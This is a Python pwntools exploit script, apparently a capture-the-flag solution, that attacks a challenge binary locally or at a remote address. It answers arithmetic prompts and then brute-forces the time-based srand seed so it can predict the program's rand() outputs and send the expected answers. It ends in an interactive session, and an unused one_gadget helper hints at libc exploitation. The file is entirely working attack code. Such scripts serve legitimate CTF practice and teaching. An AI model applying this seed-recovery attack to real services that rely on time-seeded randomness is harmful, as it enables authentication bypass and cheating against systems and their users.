#!/usr/bin/env python3
import ctypes
import time
from pwn import *

elf = ELF("./main_patched")

context.update(binary=elf, encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("198.199.90.158", 34402)
    else:
        return process([elf.path])

# write function that parses x + y = ? and returns the result
def parse_math_problem(problem):
    problem = problem.split(" ")
    x = int(problem[0])
    y = int(problem[2])
    return x + y

def find_seed_and_offset(target_number):
    # Load the libc library using ctypes
    libc = ctypes.CDLL("libc.so.6")

    # Get the current time
    current_time = int(time.time())

    # Define the time range for the seed search (10 seconds before and after running the script)
    start_time = current_time - 10
    end_time = current_time + 10

    # Perform the seed search
    for seed in range(start_time, end_time + 1):
        # Set the srand seed using libc's srand function
        libc.srand(seed)

        # Generate 9000 random numbers and check if the target number is found
        offset = 0
        for i in range(9000):
            random_number = libc.rand()
            if random_number == target_number:
                return seed, offset
            offset += 1

    # If the seed is not found within the time range, return None
    return None, None


def main():
    io = start()
    io.recvuntil("math!\n")
    for i in range(5):
        problem = io.recvline().decode()
        result = parse_math_problem(problem)
        io.sendline(str(result))

    io.recvuntil("= ")
    result = int(io.recvline().decode())
    seed, offset = find_seed_and_offset(result)
    info(f"Seed: {seed}")
    info(f"Offset: {offset}")

    libc = ctypes.CDLL("libc.so.6")
    libc.srand(seed)
    for i in range(offset - 1):
        libc.rand()

    for i in range(5):
        b, c = libc.rand(), libc.rand()
        a = c - b
        io.sendline(str(a))
        io.clean()

        


    io.interactive()


if __name__ == "__main__":
    main()
